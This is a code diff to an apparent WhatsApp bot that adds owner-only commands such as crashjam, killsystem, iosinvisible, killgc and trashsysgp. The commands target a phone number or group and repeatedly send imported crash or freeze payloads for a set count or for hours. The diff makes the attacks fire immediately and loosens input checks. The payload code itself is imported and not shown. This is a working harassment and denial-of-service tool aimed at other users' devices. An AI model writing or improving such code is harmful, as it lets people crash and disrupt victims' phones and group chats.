@@ -37,39 +37,68 @@ function notifySending(sock, chat, target) {
   return sock.sendMessage(chat, { text: caption });
 }
 
+async function checkWhatsAppUser(sock, cleanTarget) {
+  try {
+    const res = await sock.onWhatsApp(cleanTarget);
+    const existsObj = Array.isArray(res) ? res[0] : res;
+    return Boolean(existsObj && existsObj.exists !== false);
+  } catch (e) {
+    return true; // Fallback if lookup fails
+  }
+}
+
 export async function crashjamCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage:\n.crashjam <number> <hours or "only count">\nExample: .crashjam +919876543210 1\nExample: .crashjam +919876543210 only 5' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage:\n.crashjam <number> [hours or "only count"]\nExample: .crashjam +919876543210 1\nExample: .crashjam +919876543210 only 5' }, { quoted: msg });
   }
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
     const delayMs = 2000;
 
-    if (args[1] === 'only') {
-      const count = parseInt(args[2]) || 1;
+    if (!args[1] || args[1] === 'only') {
+      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
       let sent = 0;
-      const interval = setInterval(async () => {
-        if (sent >= count) return clearInterval(interval);
-        try {
-          await crashjamLogic.crashjam(sock, targetJid);
-          sent++;
-        } catch (e) {
-          console.error('[crashjam only]', e.message);
-        }
-      }, delayMs);
+
+      try {
+        await crashjamLogic.crashjam(sock, targetJid);
+        sent++;
+      } catch (e) {
+        console.error('[crashjam only immediate]', e.message);
+      }
+
+      if (sent < count) {
+        const interval = setInterval(async () => {
+          if (sent >= count) { clearInterval(interval); return; }
+          try {
+            await crashjamLogic.crashjam(sock, targetJid);
+            sent++;
+            if (sent >= count) clearInterval(interval);
+          } catch (e) {
+            console.error('[crashjam only]', e.message);
+          }
+        }, delayMs);
+      }
     } else {
       const hours = parseInt(args[1]) || 1;
       const endTime = Date.now() + hours * 60 * 60 * 1000;
+
+      try {
+        await crashjamLogic.crashjam(sock, targetJid);
+      } catch (e) {
+        console.error('[crashjam time immediate]', e.message);
+      }
+
       const interval = setInterval(async () => {
-        if (Date.now() >= endTime) return clearInterval(interval);
+        if (Date.now() >= endTime) { clearInterval(interval); return; }
         try {
           await crashjamLogic.crashjam(sock, targetJid);
         } catch (e) {
@@ -84,37 +113,56 @@ export async function crashjamCommand(sock, chat, msg, args) {
 
 export async function killsystemCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage:\n.killsystem <number> <hours or "only count">\nExample: .killsystem +919876543210 1' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage:\n.killsystem <number> [hours or "only count"]\nExample: .killsystem +919876543210 1' }, { quoted: msg });
   }
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
     const delayMs = 2000;
 
-    if (args[1] === 'only') {
-      const count = parseInt(args[2]) || 1;
+    if (!args[1] || args[1] === 'only') {
+      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
       let sent = 0;
-      const interval = setInterval(async () => {
-        if (sent >= count) return clearInterval(interval);
-        try {
-          await killsystemLogic.killsystem(sock, targetJid);
-          sent++;
-        } catch (e) {
-          console.error('[killsystem only]', e.message);
-        }
-      }, delayMs);
+
+      try {
+        await killsystemLogic.killsystem(sock, targetJid);
+        sent++;
+      } catch (e) {
+        console.error('[killsystem only immediate]', e.message);
+      }
+
+      if (sent < count) {
+        const interval = setInterval(async () => {
+          if (sent >= count) { clearInterval(interval); return; }
+          try {
+            await killsystemLogic.killsystem(sock, targetJid);
+            sent++;
+            if (sent >= count) clearInterval(interval);
+          } catch (e) {
+            console.error('[killsystem only]', e.message);
+          }
+        }, delayMs);
+      }
     } else {
       const hours = parseInt(args[1]) || 1;
       const endTime = Date.now() + hours * 60 * 60 * 1000;
+
+      try {
+        await killsystemLogic.killsystem(sock, targetJid);
+      } catch (e) {
+        console.error('[killsystem time immediate]', e.message);
+      }
+
       const interval = setInterval(async () => {
-        if (Date.now() >= endTime) return clearInterval(interval);
+        if (Date.now() >= endTime) { clearInterval(interval); return; }
         try {
           await killsystemLogic.killsystem(sock, targetJid);
         } catch (e) {
@@ -132,10 +180,11 @@ export async function crashfinityCommand(sock, chat, msg, args) {
   if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashfinity <number>' }, { quoted: msg });
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
@@ -150,10 +199,11 @@ export async function stickercrashCommand(sock, chat, msg, args) {
   if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .stickercrash <number>' }, { quoted: msg });
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
@@ -170,10 +220,11 @@ export async function callcrashCommand(sock, chat, msg, args) {
   if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .callcrash <number>' }, { quoted: msg });
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
@@ -190,10 +241,11 @@ export async function xdelayCommand(sock, chat, msg, args) {
   if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xdelay <number>' }, { quoted: msg });
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
@@ -210,10 +262,11 @@ export async function xbetainvisCommand(sock, chat, msg, args) {
   if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xbetainvis <number>' }, { quoted: msg });
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
@@ -227,37 +280,56 @@ export async function xbetainvisCommand(sock, chat, msg, args) {
 
 export async function iosinvisibleCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage: .iosinvisible <number> <hours or "only count">\nExample: .iosinvisible +919876543210 1' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage: .iosinvisible <number> [hours or "only count"]\nExample: .iosinvisible +919876543210 1' }, { quoted: msg });
   }
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
     const delayMs = 500;
 
-    if (args[1] === 'only') {
-      const count = parseInt(args[2]) || 1;
+    if (!args[1] || args[1] === 'only') {
+      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
       let sent = 0;
-      const interval = setInterval(async () => {
-        if (sent >= count) return clearInterval(interval);
-        try {
-          await IosLogic.IosInvisible(sock, targetJid);
-          sent++;
-        } catch (e) {
-          console.error('[IosInvisible only]', e.message);
-        }
-      }, delayMs);
+
+      try {
+        await IosLogic.IosInvisible(sock, targetJid);
+        sent++;
+      } catch (e) {
+        console.error('[IosInvisible only immediate]', e.message);
+      }
+
+      if (sent < count) {
+        const interval = setInterval(async () => {
+          if (sent >= count) { clearInterval(interval); return; }
+          try {
+            await IosLogic.IosInvisible(sock, targetJid);
+            sent++;
+            if (sent >= count) clearInterval(interval);
+          } catch (e) {
+            console.error('[IosInvisible only]', e.message);
+          }
+        }, delayMs);
+      }
     } else {
       const hours = parseInt(args[1]) || 1;
       const endTime = Date.now() + hours * 60 * 60 * 1000;
+
+      try {
+        await IosLogic.IosInvisible(sock, targetJid);
+      } catch (e) {
+        console.error('[IosInvisible time immediate]', e.message);
+      }
+
       const interval = setInterval(async () => {
-        if (Date.now() >= endTime) return clearInterval(interval);
+        if (Date.now() >= endTime) { clearInterval(interval); return; }
         try {
           await IosLogic.IosInvisible(sock, targetJid);
         } catch (e) {
@@ -272,8 +344,8 @@ export async function iosinvisibleCommand(sock, chat, msg, args) {
 
 export async function xgroupCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage: .xgroup <groupJid> <hours>\nExample: .xgroup 123456789@g.us 1' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage: .xgroup <groupJid> [hours]\nExample: .xgroup 123456789@g.us 1' }, { quoted: msg });
   }
 
   const targetJid = args[0].trim();
@@ -288,8 +360,12 @@ export async function xgroupCommand(sock, chat, msg, args) {
     const delayMs = 2000;
     const endTime = Date.now() + hours * 60 * 60 * 1000;
 
+    if (typeof XgcLogic.Xgc === 'function') {
+      try { await XgcLogic.Xgc(sock, targetJid); } catch (e) { console.error('[xgroup immediate]', e.message); }
+    }
+
     const interval = setInterval(async () => {
-      if (Date.now() >= endTime) return clearInterval(interval);
+      if (Date.now() >= endTime) { clearInterval(interval); return; }
       try {
         if (typeof XgcLogic.Xgc === 'function') {
           await XgcLogic.Xgc(sock, targetJid);
@@ -305,8 +381,8 @@ export async function xgroupCommand(sock, chat, msg, args) {
 
 export async function killgcCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage: .killgc <groupJid> <hours>\nExample: .killgc 123456789@g.us 1' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage: .killgc <groupJid> [hours]\nExample: .killgc 123456789@g.us 1' }, { quoted: msg });
   }
 
   const targetJid = args[0].trim();
@@ -321,8 +397,12 @@ export async function killgcCommand(sock, chat, msg, args) {
     const delayMs = 2000;
     const endTime = Date.now() + hours * 60 * 60 * 1000;
 
+    if (typeof gcFrzLogic.gcFrz === 'function') {
+      try { await gcFrzLogic.gcFrz(sock, targetJid); } catch (e) { console.error('[killgc immediate]', e.message); }
+    }
+
     const interval = setInterval(async () => {
-      if (Date.now() >= endTime) return clearInterval(interval);
+      if (Date.now() >= endTime) { clearInterval(interval); return; }
       try {
         if (typeof gcFrzLogic.gcFrz === 'function') {
           await gcFrzLogic.gcFrz(sock, targetJid);
@@ -338,8 +418,8 @@ export async function killgcCommand(sock, chat, msg, args) {
 
 export async function trashsysgpCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage: .trashsysgp <groupJid> <hours>' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage: .trashsysgp <groupJid> [hours]' }, { quoted: msg });
   }
 
   const targetJid = args[0].trim();
@@ -354,8 +434,13 @@ export async function trashsysgpCommand(sock, chat, msg, args) {
     const delayMs = 2000;
     const endTime = Date.now() + hours * 60 * 60 * 1000;
 
+    try {
+      if (typeof killsystemLogic.killsystem === 'function') await killsystemLogic.killsystem(sock, targetJid);
+      if (typeof gcFrzLogic.gcFrz === 'function') await gcFrzLogic.gcFrz(sock, targetJid);
+    } catch (e) { console.error('[trashsysgp immediate]', e.message); }
+
     const interval = setInterval(async () => {
-      if (Date.now() >= endTime) return clearInterval(interval);
+      if (Date.now() >= endTime) { clearInterval(interval); return; }
       try {
         if (typeof killsystemLogic.killsystem === 'function') {
           await killsystemLogic.killsystem(sock, targetJid);
@@ -374,32 +459,23 @@ export async function trashsysgpCommand(sock, chat, msg, args) {
 
 export async function testCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (args.length < 2) {
-    return sock.sendMessage(chat, { text: '❌ Usage: .test <number> <hours or "only count">' }, { quoted: msg });
+  if (!args[0]) {
+    return sock.sendMessage(chat, { text: '❌ Usage: .test <number> [count or "only" count]' }, { quoted: msg });
   }
 
   const cleanTarget = cleanNumber(args[0]);
+  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
   const targetJid = `${cleanTarget}@s.whatsapp.net`;
 
   try {
-    const [exists] = await sock.onWhatsApp(targetJid);
+    const exists = await checkWhatsAppUser(sock, cleanTarget);
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget);
 
-    if (args[1] === 'only') {
-      const count = parseInt(args[2]) || 1;
-      for (let i = 0; i < count; i++) {
-        await testlogic.test(sock, targetJid);
-        await testlogic.test(sock, targetJid);
-      }
-    } else {
-      const hours = parseInt(args[1]) || 1;
-      const endTime = Date.now() + hours * 60 * 60 * 1000;
-      while (Date.now() < endTime) {
-        await testlogic.test(sock, targetJid);
-        await testlogic.test(sock, targetJid);
-      }
+    const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : (parseInt(args[1]) || 1);
+    for (let i = 0; i < count; i++) {
+      await testlogic.test(sock, targetJid);
     }
   } catch (err) {
     sock.sendMessage(chat, { text: `❌ Error: ${err.message}` }, { quoted: msg });
